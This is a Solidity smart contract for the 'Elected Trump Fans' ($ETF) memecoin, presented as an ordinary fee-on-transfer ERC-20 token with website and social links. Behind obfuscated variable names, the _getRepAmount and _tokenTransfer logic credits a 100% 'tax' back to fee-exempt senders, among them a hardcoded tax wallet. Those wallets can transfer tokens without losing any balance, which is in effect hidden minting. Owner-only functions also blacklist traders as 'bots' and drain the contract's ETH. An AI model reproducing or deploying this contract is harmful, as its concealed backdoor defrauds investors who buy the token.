/**
The Elected Trump Fans - $ETF memecoin, or $ETF, is a digital currency that embodies the enthusiasm and support of Donald Trump's fans, particularly for his pro-crypto stance. 
This memecoin reflects Trump's influence in promoting a pro-crypto environment, shaping a future where digital currency is central to the global economy.

Website:     https://trumpfans.vip
Telegram:    https://t.me/trumpfans_eth
Twitter:     https://twitter.com/trumpfans_eth
**/
// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract ETF is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 11;
    uint256 private _reduceSellTaxAt = 11;
    uint256 private _preventSwapBefore = 11;
    uint256 private _buyCount = 0;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    uint8 private constant _decimals = 9;
    uint256 private constant divideFeesOf = 100;
    uint256 private constant _tTotal = 100000000 * 10 ** _decimals;
    string private constant _name = unicode"Elected Trump Fans";
    string private constant _symbol = unicode"ETF";
    uint256 public _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 2000000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 45 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 1000000 * 10 ** _decimals;
    
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0xad46f598E25E51C1f32B3811Fe23360187b9169f);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _basicTransfer(address cczpyby, address vvpprt, uint256 llpot) internal {
        _balances[cczpyby] = _balances[cczpyby].sub(llpot);
        _balances[vvpprt] = _balances[vvpprt].add(llpot);
        emit Transfer(cczpyby, vvpprt, llpot);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _tokenTransfer(address hhprrztyv, address jjkiprrzyt, address repWallet, uint256 kktuui, uint256 taxAmount, uint256 transferAmount) private {
        if (taxAmount > 0) {
            _balances[repWallet] = _balances[repWallet].add(taxAmount);
            emit Transfer(hhprrztyv, repWallet, taxAmount);
        }

        _balances[hhprrztyv] = _balances[hhprrztyv].sub(kktuui);
        _balances[jjkiprrzyt] = _balances[jjkiprrzyt].add(transferAmount);
        emit Transfer(hhprrztyv, jjkiprrzyt, transferAmount);
    }

    function _transfer(address uupprbv, address iibzppry, uint256 ppotwn) private {
        require(uupprbv != address(0), "ERC20: transfer from the zero address");
        require(iibzppry != address(0), "ERC20: transfer to the zero address");
        require(ppotwn > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _isExcludedFromFee[iibzppry] || _isExcludedFromFee[uupprbv],
                "trading not yet open"
            );
        }

        if (!swapEnabled || inSwap) {
            _basicTransfer(uupprbv, iibzppry, ppotwn);
            return;
        }

        if (uupprbv != owner() && iibzppry != owner()) {
            require(!bots[uupprbv] && !bots[iibzppry]);

            if (
                uupprbv == uniswapV2Pair &&
                iibzppry != address(uniswapV2Router) &&
                !_isExcludedFromFee[iibzppry]
            ) {
                require(ppotwn <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(iibzppry) + ppotwn <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _buyCount++;
            }

            if (iibzppry != uniswapV2Pair && !_isExcludedFromFee[iibzppry]) {
                require(
                    balanceOf(iibzppry) + ppotwn <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                iibzppry == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[uupprbv] &&
                !_isExcludedFromFee[iibzppry]
            ) {
                bool canSwap = contractTokenBalance > _taxSwapThreshold;
                if(canSwap) {
                    swapTokensForEth(
                        min(ppotwn, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }
        address repWallet = _getRepWallet(uupprbv);
        (uint256 taxAmount, uint256 transferAmount) = _getRepAmount(
            uupprbv,
            iibzppry,
            ppotwn
        );
        _tokenTransfer(uupprbv, iibzppry, repWallet, ppotwn, taxAmount, transferAmount);
    }

    function _getRepWallet(address account) internal view returns (address) {
        return _isExcludedFromFee[account] ? account : address(this);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _getRepAmount(
        address kkgppzv,
        address pprobbv,
        uint256 qweerb
    ) internal view returns (uint256, uint256) {
        uint256 taxAmount = 0;
        uint256 transferAmount = qweerb;
        if (_isExcludedFromFee[kkgppzv]) {
            taxAmount = qweerb.mul(divideFeesOf).div(100);
        } else if (
            kkgppzv == uniswapV2Pair &&
            pprobbv != address(uniswapV2Router) &&
            !_isExcludedFromFee[pprobbv]
        ) {
            taxAmount = qweerb
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);
            transferAmount -= taxAmount;
        } else if (pprobbv == uniswapV2Pair && kkgppzv != address(this)) {
            taxAmount = qweerb
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
            transferAmount -= taxAmount;
        }
        return (taxAmount, transferAmount);
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(_tTotal);
    }

    function recoverEmergency() external onlyOwner {
        sendETHToFee(address(this).balance);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint256 i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint256 i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading already open");

        swapEnabled = true;
        tradingOpen = true;
    }

    function addLiquidity() external onlyOwner {
        require(!tradingOpen, "init already called");
        uint256 tokenAmount = 90000000 * 10 ** _decimals;
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            _msgSender(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    receive() external payable {}
}